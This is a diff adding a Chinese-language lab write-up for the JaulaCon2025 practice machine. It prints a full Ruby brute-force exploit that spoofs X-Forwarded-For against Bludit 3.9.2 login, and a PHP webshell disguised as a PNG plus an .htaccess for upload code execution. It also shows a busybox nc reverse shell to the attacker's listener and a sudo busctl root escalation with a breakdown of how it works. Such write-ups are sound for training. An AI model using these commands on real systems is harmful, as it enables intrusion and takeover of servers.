@@ -2274,3 +2274,507 @@ auditor@debian:~/dfir_eltopo$
 > （攻击者从内网服务器**窃取的文件的完整准确文件名**是什么？）
 
 还是在问题六中，攻击者ftp登录上去get了`client_database_backup.zip`
+
+## JaulaCon2025
+> **提示:** 靶机跳转传送门
+[JaulaCon2025](https://labs.thehackerslabs.com/machines/104)
+
+<img src="/assets/img/thehackerslabs-notes/JaulaCon2025.png" alt="JaulaCon2025" style="zoom:50%;" />
+### 信息搜集
+
+```bash
+(base) yolo@yolo:~$ nmap -sV -Pn 10.161.196.38
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-20 19:26 CST
+Nmap scan report for jaulacon2025.thl (10.161.196.38)
+Host is up (0.71s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds
+```
+
+根据经验，这里需要通过http服务渗透进去拿到shell
+
+第一次访问，发现这里需要提前编辑下hosts文件，给/etc/hosts增加内容
+
+```bash
+10.161.196.38 jaulacon2025.thl
+```
+
+经过dirsearch路径爆破扫描，发现没有什么有用的信息，回来看看这个web服务的版本号，看看有没有什么cve
+
+可以看到是bludit项目，这是个简易的cms服务，然后版本号也很低，是3.9.2
+
+<img src="/assets/img/thehackerslabs-notes/image-20251120193432817.png" alt="image-20251120193432817" style="zoom:50%;" />
+
+可以上[官网](https://www.bludit.com/)看到，最新版本都到3.16.2了，接下来看看cve
+
+```bash
+(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ searchsploit bludit
+------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                |  Path
+------------------------------------------------------------------------------ ---------------------------------
+Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass                   | php/webapps/48746.rb
+Bludit - Directory Traversal Image File Upload (Metasploit)                   | php/remote/47699.rb
+Bludit 3-14-1 Plugin 'UploadPlugin' - Remote Code Execution (RCE) (Authentica | php/webapps/51160.txt
+Bludit 3.13.1 - 'username' Cross Site Scripting (XSS)                         | php/webapps/50529.txt
+Bludit 3.9.12 - Directory Traversal                                           | php/webapps/48568.py
+Bludit 3.9.2 - Auth Bruteforce Bypass                                         | php/webapps/48942.py
+Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                  | php/webapps/49037.rb
+Bludit 3.9.2 - Directory Traversal                                            | multiple/webapps/48701.txt
+Bludit 4.0.0-rc-2 - Account takeover                                          | php/webapps/51360.txt
+Bludit < 3.13.1 Backup Plugin - Arbitrary File Download (Authenticated)       | php/webapps/51541.py
+Bludit CMS v3.14.1 - Stored Cross-Site Scripting (XSS) (Authenticated)        | php/webapps/51476.txt
+bludit Pages Editor 3.0.0 - Arbitrary File Upload                             | php/webapps/46060.txt
+------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ searchsploit -m 48746.rb
+  Exploit: Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass
+      URL: https://www.exploit-db.com/exploits/48746
+     Path: /snap/searchsploit/542/opt/exploitdb/exploits/php/webapps/48746.rb
+    Codes: CVE-2019-17240
+ Verified: True
+File Type: <missing file package>
+Copied to: /home/yolo/Desktop/tools/Bludit-3.9.2-Auth-Bypass/48746.rb
+
+(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ searchsploit -m 48701.txt
+  Exploit: Bludit 3.9.2 - Directory Traversal
+      URL: https://www.exploit-db.com/exploits/48701
+     Path: /snap/searchsploit/542/opt/exploitdb/exploits/multiple/webapps/48701.txt
+    Codes: CVE-2019-16113
+ Verified: False
+File Type: <missing file package>
+Copied to: /home/yolo/Desktop/tools/Bludit-3.9.2-Auth-Bypass/48701.txt
+(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ cat 48701.txt | less
+
+```
+
+看了下，这里有两个exp我能用到，分别是48746.rb用来爆破密码，然后48701.txt是python脚本上传恶意文件
+
+这里我其实尝试过用yakit或burp抓包爆破账密，但是失败了，这里绝对有限制，`Bludit CMS`在登录接口`/admin/login`中有一个暴力破解防护机制，它通过检测客户端的IP地址来判断是否有多次错误登录尝试，就是说短时间爆破是不可能成功的，然后呢，这个exp会在每次请求的时候伪造一个新IP来绕过防护机制，从而实现无限制暴力破解
+
+```bash
+(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ cat 48746.rb
+#!/usr/bin/env ruby
+## Title: Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass
+## Author: noraj (Alexandre ZANNI)
+## Author website: https://pwn.by/noraj/
+## Date: 2020-08-16
+## Vendor Homepage: https://www.bludit.com/
+## Software Link: https://github.com/bludit/bludit/archive/3.9.2.tar.gz
+## Version: <= 3.9.2
+## Tested on: Bludit Version 3.9.2
+
+# Vulnerability
+## Discoverer: Rastating
+## Discoverer website: https://rastating.github.io/
+## CVE: CVE-2019-17240
+## CVE URL: https://nvd.nist.gov/vuln/detail/CVE-2019-17240
+## References: https://rastating.github.io/bludit-brute-force-mitigation-bypass/
+## Patch: https://github.com/bludit/bludit/pull/1090
+
+require 'httpclient'
+require 'docopt'
+
+# dirty workaround to remove this warning:
+#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.
+# see https://github.com/nahi/httpclient/issues/252
+class WebAgent
+  class Cookie < HTTP::Cookie
+    def domain
+      self.original_domain
+    end
+  end
+end
+
+def get_csrf(client, login_url)
+  res = client.get(login_url)
+  csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0]
+end
+
+def auth_ok?(res)
+  HTTP::Status.redirect?(res.code) &&
+    %r{/admin/dashboard}.match?(res.headers['Location'])
+end
+
+def bruteforce_auth(client, host, username, wordlist)
+  login_url = host + '/admin/login'
+  File.foreach(wordlist).with_index do |password, i|
+    password = password.chomp
+    csrf_token = get_csrf(client, login_url)
+    headers = {
+      'X-Forwarded-For' => "#{i}-#{password[..4]}",
+    }
+    data = {
+      'tokenCSRF' => csrf_token,
+      'username' => username,
+      'password' => password,
+    }
+    puts "[*] Trying password: #{password}"
+    auth_res = client.post(login_url, data, headers)
+    if auth_ok?(auth_res)
+      puts "\n[+] Password found: #{password}"
+      break
+    end
+  end
+end
+
+doc = <<~DOCOPT
+  Bludit <= 3.9.2 - Authentication Bruteforce Mitigation Bypass
+
+  Usage:
+    #{__FILE__} -r <url> -u <username> -w <path> [--debug]
+    #{__FILE__} -H | --help
+
+  Options:
+    -r <url>, --root-url <url>            Root URL (base path) including HTTP scheme, port and root folder
+    -u <username>, --user <username>      Username of the admin
+    -w <path>, --wordlist <path>          Path to the wordlist file
+    --debug                               Display arguments
+    -H, --help                            Show this screen
+
+  Examples:
+    #{__FILE__} -r http://example.org -u admin -w myWordlist.txt
+    #{__FILE__} -r https://example.org:8443/bludit -u john -w /usr/share/wordlists/password/rockyou.txt
+DOCOPT
+
+begin
+  args = Docopt.docopt(doc)
+  pp args if args['--debug']
+
+  clnt = HTTPClient.new
+  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--wordlist'])
+rescue Docopt::Exit => e
+  puts e.message
+```
+
+执行脚本，对了，这里的用户名是尝试的主页的一个`Jaulacon2025`
+
+<img src="/assets/img/thehackerslabs-notes/image-20251120214839804.png" alt="image-20251120214839804" style="zoom:50%;" />
+
+```bash
+(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ ruby 48746.rb -r http://jaulacon2025.thl -u Jaulacon2025 -w /snap/seclists/rockyou.txt
+[*] Trying password: 123456
+......
+
+[+] Password found: cassandra
+```
+
+拿到了账密，然后呢，用第二个payload，这里需要我自己写几个🐎
+
+```bash
+(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ head -n 40 48701.py
+# Title: Bludit 3.9.2 - Directory Traversal
+# Author: James Green
+# Date: 2020-07-20
+# Vendor Homepage: https://www.bludit.com
+# Software Link: https://github.com/bludit/bludit
+# Version: 3.9.2
+# Tested on: Linux Ubuntu 19.10 Eoan
+# CVE: CVE-2019-16113
+#
+# Special Thanks to Ali Faraj (@InfoSecAli) and authors of MSF Module https://www.exploit-db.com/exploits/47699
+
+#### USAGE ####
+# 1. Create payloads: .png with PHP payload and the .htaccess to treat .pngs like PHP
+# 2. Change hardcoded values: URL is your target webapp, username and password is admin creds to get to the admin dir
+# 3. Run the exploit
+# 4. Start a listener to match your payload: `nc -nlvp 53`, meterpreter multi handler, etc
+# 5. Visit your target web app and open the evil picture: visit url + /bl-content/tmp/temp/evil.png
+
+#!/usr/bin/env python3
+
+import requests
+import re
+import argparse
+import random
+import string
+import base64
+from requests.exceptions import Timeout
+
+url = 'http://jaulacon2025.thl'  # CHANGE ME
+username = 'Jaulacon2025'  # CHANGE ME
+password = 'cassandra'  # CHANGE ME
+
+# msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=53 -f raw -b '"' > evil.png
+# echo -e "<?php $(cat evil.png)" > evil.png
+payload = 'evil.png'  # CREATE ME
+
+# echo "RewriteEngine off" > .htaccess
+# echo "AddType application/x-httpd-php .png" >> .htaccess
+payload2 = '.htaccess'  # CREATE ME
+
+```
+
+按照上面说的，我们把一些信息编辑上去，然后再编辑对应的一句话木马和.htaccess
+
+```bash
+(base) yolo@yolo:~$ cat evil.png
+<?php
+  system($_GET['cmd']);
+?>
+(base) yolo@yolo:~$ cat .htaccess
+RewriteEngine off
+AddType application/x-httpd-php .png
+(base) yolo@yolo:~$ python 48701.py
+cookie: 8sh7sgjk3rv4se81ndbuim4bok
+csrf_token: 6c74ed9acb57b73ecd88f3fda179efb743c52860
+Uploading payload: evil.png
+Uploading payload: .htaccess
+```
+
+对了，回顾那个py文件，可以看到，接下来的做法应该是访问这个路由`/bl-content/tmp/temp/evil.png`开始执行命令
+
+```bash
+(base) yolo@yolo:~$ curl http://jaulacon2025.thl/bl-content/tmp/temp/evil.png?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### get shell
+
+接下来呢，直接弹shell就好了
+
+浏览器直接执行
+
+```bash
+http://jaulacon2025.thl/bl-content/tmp/temp/evil.png?cmd=busybox%20nc%2010.161.248.64%204444%20-e%20bash
+```
+
+然后提前在本地开启监听
+
+```bash
+┌─[user@parrot]─[~]
+└──╼ $nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.161.196.38 45564
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+接下来继续维持一下shell
+
+```bash
+/usr/bin/script -qc /bin/bash /dev/null
+^z
+stty raw -echo;fg
+reset
+xterm
+```
+
+这里有个关键文件
+
+```bash
+www-data@JaulaCon2025:/var/www/html/bl-content$ ls
+databases  pages  tmp  uploads	workspaces
+www-data@JaulaCon2025:/var/www/html/bl-content$ cd databases
+www-data@JaulaCon2025:/var/www/html/bl-content/databases$ ls
+categories.php	plugins       site.php	  tags.php
+pages.php	security.php  syslog.php  users.php
+www-data@JaulaCon2025:/var/www/html/bl-content/databases$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+......
+mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false
+JaulaCon2025:x:1001:1001::/home/JaulaCon2025:/bin/bash
+www-data@JaulaCon2025:/var/www/html/bl-content/databases$ cat users.php
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Admin",
+......
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""
+    },
+    "Jaulacon2025": {
+        "firstName": "",
+        "lastName": "",
+......
+        "gitlab": "",
+        "linkedin": "",
+        "mastodon": ""
+    },
+    "JaulaCon2025": {
+        "firstName": "",
+        "lastName": "",
+        "nickname": "",
+        "description": "",
+        "role": "author",
+        "password": "551211bcd6ef18e32742a73fcb85430b",
+        "salt": "jejej",
+        "email": "",
+        "registered": "2025-03-25 19:43:25",
+        "tokenRemember": "",
+        "tokenAuth": "d1ed37a30b769e2e48123c3efaa1e357",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "codepen": "",
+        "instagram": "",
+        "github": "",
+        "gitlab": "",
+        "linkedin": "",
+        "mastodon": ""
+    }
+}
+```
+
+发现这里的数据库信息里面，有/etc/passwd中记录的一个用户的密码哈希，用[在线网站](https://crackstation.net/)进行爆破
+
+<img src="/assets/img/thehackerslabs-notes/image-20251120223254386.png" alt="image-20251120223254386" style="zoom:50%;" />
+
+接下来其实更建议重新开一个终端，直接ssh上去,然后提权也很轻松
+
+```bash
+(base) yolo@yolo:~$ ssh JaulaCon2025@10.161.196.38
+JaulaCon2025@10.161.196.38's password:
+Linux JaulaCon2025 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Nov 20 15:05:45 2025 from 10.161.155.145
+JaulaCon2025@JaulaCon2025:~$ id
+uid=1001(JaulaCon2025) gid=1001(JaulaCon2025) grupos=1001(JaulaCon2025)
+JaulaCon2025@JaulaCon2025:~$ ls
+user.txt
+JaulaCon2025@JaulaCon2025:~$ cat user.txt
+368409a919088e8707d0617365??????  -
+JaulaCon2025@JaulaCon2025:~$ sudo -l
+sudo: unable to resolve host JaulaCon2025: Nombre o servicio desconocido
+Matching Defaults entries for JaulaCon2025 on JaulaCon2025:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User JaulaCon2025 may run the following commands on JaulaCon2025:
+    (root) NOPASSWD: /usr/bin/busctl
+JaulaCon2025@JaulaCon2025:~$ sudo /usr/bin/busctl  set-property org.freedesktop.systemd1 /org/freedesktop/system
+d1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i
+0<&2 1>&2'
+sudo: unable to resolve host JaulaCon2025: Nombre o servicio desconocido
+# id
+uid=0(root) gid=0(root) grupos=0(root)
+# cd
+# cat root.txt
+097fac9db83a1806f3355cf952??????  -
+```
+
+### busctl 提权 Payload 分析
+
+#### 命令
+
+```
+sudo /usr/bin/busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 \
+org.freedesktop.systemd1.Manager LogLevel s debug \
+--address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
+```
+
+------
+
+#### 一、命令结构总览
+
+这个命令可以分为三大部分：
+
+| 部分 | 内容                                    | 功能                                                         |
+| ---- | --------------------------------------- | ------------------------------------------------------------ |
+| 1️⃣    | `sudo /usr/bin/busctl set-property ...` | 以 root 权限执行 busctl 操作 systemd D-Bus 接口              |
+| 2️⃣    | `--address=unixexec:...`                | 指定一个“伪造的”D-Bus 地址，实际执行 `/bin/sh`               |
+| 3️⃣    | `/bin/sh -i 0<&2 1>&2`                  | 启动一个交互式 shell 并绑定到标准错误，实现本地提权交互 shell |
+
+最终结果是：**通过滥用 D-Bus 传输机制，获得了 root 权限的交互式 shell。**
+
+------
+
+#### 二、busctl 与 D-Bus 简介
+
+- `busctl` 是 systemd 提供的 D-Bus 客户端工具，用于与 D-Bus 服务通信。
+- 典型用途是读取或设置 D-Bus 接口属性（如 systemd 的日志级别、服务状态等）。
+- 通常情况下，`busctl` 会连接到系统总线（`system bus`），与 `systemd` 的守护进程通信。
+
+------
+
+#### 三、正常行为分析
+
+命令前半部分：
+
+```
+sudo busctl set-property org.freedesktop.systemd1 \
+/org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug
+```
+
+这只是把 systemd 的日志级别改为 `debug`。
+ 这个操作需要 root 权限，所以 `sudo` 是合法存在的。
+ 但它本身并不会执行任何危险操作。
+
+------
+
+#### 四、漏洞/利用点：`--address=unixexec:`
+
+这里是关键：
+
+```
+--address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
+```
+
+- `--address=` 参数告诉 busctl 要连接的 D-Bus 地址。
+- `unixexec:` 是一种特殊的 D-Bus “传输类型”（transport）。
+  - 它的语义是：**不要连接到 D-Bus 守护进程，而是直接执行一个本地进程，并与之通过 UNIX 套接字通信。**
+  - 换句话说：busctl 会执行 `path` 指定的程序，把它当作“D-Bus 对等端”。
+
+因此，当 `path=/bin/sh` 时，busctl 实际上执行了 `/bin/sh`！
+
+再结合：
+
+```
+argv1=-c
+argv2='/bin/sh -i 0<&2 1>&2'
+```
+
+busctl 会调用：
+
+```
+/bin/sh -c '/bin/sh -i 0<&2 1>&2'
+```
+
+也就是启动了一个交互式 shell。
+
+------
+
+#### 五、Shell 重定向说明
+
+命令部分：
+
+```
+/bin/sh -i 0<&2 1>&2
+```
+
+- `/bin/sh -i` 启动交互式 shell；
+- `0<&2` 把 **stdin (0)** 重定向到 **stderr (2)**；
+- `1>&2` 把 **stdout (1)** 重定向到 **stderr (2)**。
+
+为什么要这么做？
+ 因为当 busctl 执行 `unixexec` 时，它的输入输出会和执行者（此处是 sudo 用户）的终端描述符绑定。
+ 通过重定向，攻击者可以把交互 IO 全部导向可交互的终端（或反弹连接）。
+
+于是结果就是：
+ 你在普通用户终端执行 `sudo busctl ...`，但得到的是 **root 的交互式 shell**。
+
+------
+
+#### 六、提权原因总结
+
+- **busctl 是以 root 身份执行的 (`sudo`)**
+- **`--address=unixexec` 被滥用来执行任意命令**
+- **最终启动 `/bin/sh` 并附着到当前终端 IO**
+
+因此，攻击者成功“借助合法命令”，直接获得 root shell。
+
+---
+
+嗷，对了，上面这个payload是我在[GTFObins](https://gtfobins.github.io/gtfobins/busctl/)里面找到的
